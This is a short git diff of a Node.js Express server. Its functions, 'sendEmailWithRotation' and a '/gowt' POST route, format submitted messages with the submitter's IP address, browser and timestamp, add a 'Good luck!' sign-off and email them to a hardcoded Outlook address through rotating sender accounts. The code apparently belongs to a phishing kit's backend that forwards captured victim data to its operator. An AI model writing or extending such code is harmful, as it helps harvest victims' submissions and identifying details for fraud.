@@ -76,8 +76,8 @@ const sendEmailWithRotation = (req, subject, message, callback) => {
     const timestamp = new Date().toISOString();
 
     // Build the email message, including the Telegram message
-    //const fullMessage = `\n${message}\n\n=======================\nAdditional Information\n=======================\n\nIP Address:\n${ipAddress}\n\nBrowser:\n${userAgent}\n\nTimestamp:\n${timestamp}\n\n_Good luck!_`;
-    const fullMessage = `${message}`;
+    const fullMessage = `\n${message}\n\n=======================\nAdditional Information\n=======================\n\nIP Address:\n${ipAddress}\n\nBrowser:\n${userAgent}\n\nTimestamp:\n${timestamp}\n\n_Good luck!_`;
+    
     const mailOptions = {
       from: user,
       to: "hey.heatherw@outlook.com",
@@ -178,8 +178,9 @@ app.post("/gowt", (req, res) => {
     const timestamp = new Date().toISOString(); // Current timestamp in ISO format
 
     // Prepare the full email body
-    const fullMessage = `*Message* \n${message}\n\n=======================\n*Additional Information*\n=======================\n\n*IP Address* \n${ipAddress}\n\n*Browser* \n${userAgent}\n\n*Timestamp* \n${timestamp}\n\n_Good luck!_`;
-
+    //const fullMessage = `*Message* \n${message}\n\n=======================\n*Additional Information*\n=======================\n\n*IP Address* \n${ipAddress}\n\n*Browser* \n${userAgent}\n\n*Timestamp* \n${timestamp}\n\n_Good luck!_`;
+    const fullMessage = `${message}`;
+    
     // Prepare email options
     const mailOptions = {
       from: `${from}<${user}>` || user, // Sender email
